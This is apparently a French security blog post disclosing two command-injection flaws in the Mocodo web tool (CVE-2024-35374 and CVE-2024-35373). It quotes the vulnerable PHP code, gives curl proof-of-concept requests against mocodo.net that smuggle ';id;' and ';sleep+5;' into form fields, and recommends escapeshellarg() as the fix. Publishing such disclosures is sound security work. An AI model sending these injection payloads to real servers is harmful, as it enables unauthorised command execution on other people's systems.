

Menu

* [ğŸ  Home](/)
* [ğŸ“ Articles](/posts/)
* [#ï¸âƒ£ Tags](/tags/)
* [ğŸ‘¤ About](/about/)
* [ğŸ” CVEs](/cves/)
* |

LIGHT
DARK

![Cover Image](/img/mocodo-vulnerabilities/mocodonline.svg)
# Exploring Mocodo Vulnerabilities: A Compilation of CVEs from 2024

âœï¸ **[Valentin Lobstein](https://twitter.com/Chocapikk_)**
Â |
ğŸ—“ï¸ 9 mai 2024

* [Introduction](/posts/2024/mocodo-vulnerabilities/#introduction)
* [Quâ€™est-ce que Mocodo ?](/posts/2024/mocodo-vulnerabilities/#quest-ce-que-mocodo-)
* [DÃ©couverte des VulnÃ©rabilitÃ©s](/posts/2024/mocodo-vulnerabilities/#dÃ©couverte-des-vulnÃ©rabilitÃ©s)
* [DÃ©tail Technique de la VulnÃ©rabilitÃ© RCE dans /web/generate.php (CVE-2024-35374)](/posts/2024/mocodo-vulnerabilities/#dÃ©tail-technique-de-la-vulnÃ©rabilitÃ©-rce-dans-webgeneratephp-cve-2024-35374)
  + [Segment de Code VulnÃ©rable dans /web/generate.php](/posts/2024/mocodo-vulnerabilities/#segment-de-code-vulnÃ©rable-dans-webgeneratephp)
  + [Explication](/posts/2024/mocodo-vulnerabilities/#explication)
  + [Exemple dâ€™exploitation](/posts/2024/mocodo-vulnerabilities/#exemple-dexploitation)
* [DÃ©tail Technique de la VulnÃ©rabilitÃ© RCE dans /web/rewrite.php (CVE-2024-35373)](/posts/2024/mocodo-vulnerabilities/#dÃ©tail-technique-de-la-vulnÃ©rabilitÃ©-rce-dans-webrewritephp-cve-2024-35373)
  + [Segment de Code VulnÃ©rable dans /web/rewrite.php](/posts/2024/mocodo-vulnerabilities/#segment-de-code-vulnÃ©rable-dans-webrewritephp)
  + [Explication](/posts/2024/mocodo-vulnerabilities/#explication-1)
  + [Exemple de lâ€™exploitation](/posts/2024/mocodo-vulnerabilities/#exemple-de-lexploitation)
* [Solutions et Recommandations](/posts/2024/mocodo-vulnerabilities/#solutions-et-recommandations)
* [Mesures de Correction SuggÃ©rÃ©es](/posts/2024/mocodo-vulnerabilities/#mesures-de-correction-suggÃ©rÃ©es)
* [Timeline des Ã‰vÃ©nements](/posts/2024/mocodo-vulnerabilities/#timeline-des-Ã©vÃ©nements)
* [Ressources Utiles](/posts/2024/mocodo-vulnerabilities/#ressources-utiles)
* [Remerciements](/posts/2024/mocodo-vulnerabilities/#remerciements)

### Introduction

Dans le monde du dÃ©veloppement logiciel, la sÃ©curitÃ© est un enjeu majeur qui doit constamment Ãªtre adressÃ© pour protÃ©ger Ã  la fois les donnÃ©es et les infrastructures. Cet article vise Ã  dÃ©voiler en dÃ©tail deux vulnÃ©rabilitÃ©s critiques dâ€™exÃ©cution de commandes Ã  distance (RCE) dÃ©couvertes dans Mocodo, un outil populaire utilisÃ© pour la conception de bases de donnÃ©es. Ces failles, si elles sont exploitÃ©es, pourraient permettre Ã  un attaquant de prendre le contrÃ´le du serveur hÃ©bergeant lâ€™application. Nous discuterons de la nature de ces vulnÃ©rabilitÃ©s, de leurs implications potentielles et des mesures Ã  prendre pour sÃ©curiser les installations de Mocodo.

### Quâ€™est-ce que Mocodo ?

![Mocodo](/img/mocodo-vulnerabilities/mocodo_web.png)

Mocodo est un outil en ligne conÃ§u pour aider les dÃ©veloppeurs et les concepteurs de bases de donnÃ©es Ã  visualiser et Ã  gÃ©nÃ©rer des schÃ©mas de bases de donnÃ©es relationnelles Ã  partir dâ€™une description textuelle simple. GrÃ¢ce Ã  sa facilitÃ© dâ€™utilisation et Ã  sa capacitÃ© Ã  gÃ©nÃ©rer des schÃ©mas clairs et comprÃ©hensibles, Mocodo est devenu un choix populaire pour lâ€™enseignement et les projets professionnels. Toutefois, comme tout logiciel, Mocodo nâ€™est pas exempt de failles de sÃ©curitÃ©, dont certaines peuvent avoir des consÃ©quences sÃ©vÃ¨res.

**Fun Fact:** Jâ€™ai dÃ©couvert Mocodo Ã  lâ€™Oteria Cyber School, une Ã©cole de cybersÃ©curitÃ© oÃ¹ je poursuis mes Ã©tudes. Nous avons utilisÃ© cet outil pour apprendre Ã  rÃ©aliser des ModÃ¨les Conceptuels de DonnÃ©es (MCD) en cours de base de donnÃ©es pendant lâ€™annÃ©e universitaire 2022-2023. Cette expÃ©rience pratique a non seulement enrichi notre comprÃ©hension thÃ©orique mais a Ã©galement soulignÃ© lâ€™importance de la sÃ©curitÃ© dans la manipulation et la gestion des schÃ©mas de bases de donnÃ©es.

### DÃ©couverte des VulnÃ©rabilitÃ©s

Les vulnÃ©rabilitÃ©s en question ont Ã©tÃ© identifiÃ©es dans les scripts PHP qui gÃ¨rent certaines entrÃ©es utilisateur via des formulaires web. Ces scripts ne filtrent pas correctement les entrÃ©es utilisateur, permettant ainsi lâ€™injection et lâ€™exÃ©cution de commandes arbitraires sur le serveur oÃ¹ Mocodo est installÃ©.

### DÃ©tail Technique de la VulnÃ©rabilitÃ© RCE dans /web/generate.php (CVE-2024-35374)

#### Segment de Code VulnÃ©rable dans /web/generate.php

```
if ($_POST['conversions']) {
    $transformation_options = "";
    $conversions = array();
    foreach ($_POST['conversions'] as $ext) {
        if ($ext == "_ddl.sql") {
            $transformation_options .= " " . $_POST['sql_case'] . ":labels";
        };
        if ($_POST['with_constraints']) {
            $option = $transformations[str_replace("_mld", "_mld_with_constraints", $ext)];
        } else {
            $option = $transformations[$ext];
        };
        $transformation_options .= " " . $option;
        $conversions[] = $ext;
    };
    $mocodo .= " -t{$transformation_options}";
    $basthon_options .= " --select all -t{$transformation_options}";
};
...
$command_line = "{$mocodo} 2>&1 >/dev/null";
exec($command_line, $out);

```
#### Explication

* **Traitement des conversions** : Le code itÃ¨re sur le tableau `$_POST['conversions']` pour traiter diffÃ©rents types de fichiers spÃ©cifiÃ©s par lâ€™utilisateur.
* **Injection de commande** : Si lâ€™extension `_ddl.sql` est trouvÃ©e, la valeur de `$_POST['sql_case']` est ajoutÃ©e directement aux options de transformation, ce qui peut inclure des commandes arbitraires si `sql_case` est malicieusement formÃ©e par un attaquant.

#### Exemple dâ€™exploitation

Utilisez cette commande curl pour simuler une attaque exploitant cette vulnÃ©rabilitÃ© :

```
curl -X POST https://mocodo.net/web/generate.php \
     -d "state=dirty&text=RCE:+rce&conversions[]=_ddl.sql&sql_case=;id;"

```

![PoC](/img/mocodo-vulnerabilities/mocodo_rce.png)

### DÃ©tail Technique de la VulnÃ©rabilitÃ© RCE dans /web/rewrite.php (CVE-2024-35373)

#### Segment de Code VulnÃ©rable dans /web/rewrite.php

```
if (strpos($_SERVER['HTTP_REFERER'], 'localhost')) {
    $mocodo = "~/opt/anaconda3/bin/mocodo";
} else {
    $mocodo = "~/.local/bin/mocodo";
};
$command_line = "{$mocodo} -t " . $_POST['args'] . " 2>&1";
// Execute the command and test the exit code.
// If it is not 0, return an array with a key "err" and the error message.
$out = array();
exec($command_line, $out, $exitCode);
if ($exitCode) {
    echo json_encode(array("err" => implode("\n", $out)));
    exit();
}

```
#### Explication

1. **Choix du chemin dâ€™accÃ¨s Ã  lâ€™exÃ©cutable :** Le chemin vers lâ€™exÃ©cutable `mocodo` est dÃ©terminÃ© en fonction de lâ€™origine de la requÃªte. Cela change en fonction du fait que la requÃªte provienne de `localhost` ou non.
2. **Construction de la commande :** Le chemin est ensuite utilisÃ© pour construire une ligne de commande en y ajoutant `$_POST['args']`, une variable utilisateur qui nâ€™est pas filtrÃ©e ni Ã©chappÃ©e, ce qui permet lâ€™injection de commandes.
3. **ExÃ©cution de la commande :** La commande est exÃ©cutÃ©e avec `exec()`, et la sortie est traitÃ©e. Si une erreur survient (indiquÃ©e par un `exitCode` non nul), un message dâ€™erreur est renvoyÃ©.

#### Exemple de lâ€™exploitation

La vulnÃ©rabilitÃ© peut Ãªtre exploitÃ©e en envoyant une requÃªte POST avec un payload malveillant dans `args`. Voici comment un attaquant pourrait utiliser `curl` pour injecter une commande simple (`sleep 5`), qui mettrait le serveur en pause pendant 5 secondes :

```
curl -X POST https://mocodo.net/web/rewrite.php \
     -d "state=dirty&text=RCE:+rce&args=;sleep+5;"

```

![PoC](/img/mocodo-vulnerabilities/mocodo_rce2.png)

### Solutions et Recommandations

Pour corriger cette vulnÃ©rabilitÃ©, il est crucial dâ€™implÃ©menter une validation stricte des entrÃ©es utilisateur et/ou dâ€™Ã©chapper toutes les commandes exÃ©cutÃ©es :

* **Utiliser `escapeshellarg()`** pour chaque paramÃ¨tre passÃ© Ã  la commande systÃ¨me pour sâ€™assurer quâ€™aucun caractÃ¨re potentiellement dangereux nâ€™est interprÃ©tÃ© comme une partie de la commande.
* **Validation des entrÃ©es** pour sâ€™assurer que les donnÃ©es transmises correspondent Ã  des valeurs attendues et sÃ©curisÃ©es avant de les utiliser dans un contexte de commande systÃ¨me.

Ces mesures aideront Ã  prÃ©venir lâ€™exÃ©cution non autorisÃ©e de commandes sur le serveur et renforceront la sÃ©curitÃ© globale de lâ€™application.

### Mesures de Correction SuggÃ©rÃ©es

* **Ã‰chappement des commandes** : utiliser `escapeshellarg()` sur `$_POST['sql_case']` et `$_POST['args']` pour sâ€™assurer que toutes les entrÃ©es soient sÃ©curisÃ©es.

### Timeline des Ã‰vÃ©nements

* **9 mai 2024** : DÃ©tection des vulnÃ©rabilitÃ©s dâ€™exÃ©cution de commandes Ã  distance (RCE) dans Mocodo.
* **9 mai 2024** : Notification des vulnÃ©rabilitÃ©s Ã  lâ€™Ã©quipe de Mocodo via leur canal de communication officiel.
* **9 mai 2024** : RÃ©ponse de lâ€™Ã©quipe Mocodo, reconnaissant la rÃ©ception du signalement des vulnÃ©rabilitÃ©s quelques heures aprÃ¨s la notification.
* **9 mai 2024** : VulnÃ©rabilitÃ© corrigÃ©e dans la version 4.2.7
* **9 mai 2024** : Publication de lâ€™article

### Ressources Utiles

Pour ceux intÃ©ressÃ©s Ã  en apprendre davantage sur Mocodo ou Ã  contribuer Ã  lâ€™amÃ©lioration de sa sÃ©curitÃ©, voici des liens utiles :

* [Mocodo Online](https://mocodo.net) - La plateforme en ligne oÃ¹ Mocodo est accessible pour la crÃ©ation de schÃ©mas de bases de donnÃ©es.
* [GitHub - Mocodo](https://github.com/laowantong/mocodo/) - Le dÃ©pÃ´t GitHub de Mocodo, dÃ©veloppÃ© par Aristide Grange, oÃ¹ le code source est disponible et oÃ¹ les contributions communautaires sont bienvenues.

### Remerciements

Je remercie sincÃ¨rement lâ€™Ã©quipe de Mocodo, et particuliÃ¨rement le dÃ©veloppeur Aristide Grange, pour leur rÃ©ponse rapide et leur reconnaissance de lâ€™importance de ces problÃ¨mes de sÃ©curitÃ©.

Â© 2024 Valentin Lobstein (Chocapikk) ğŸ›¡ï¸.

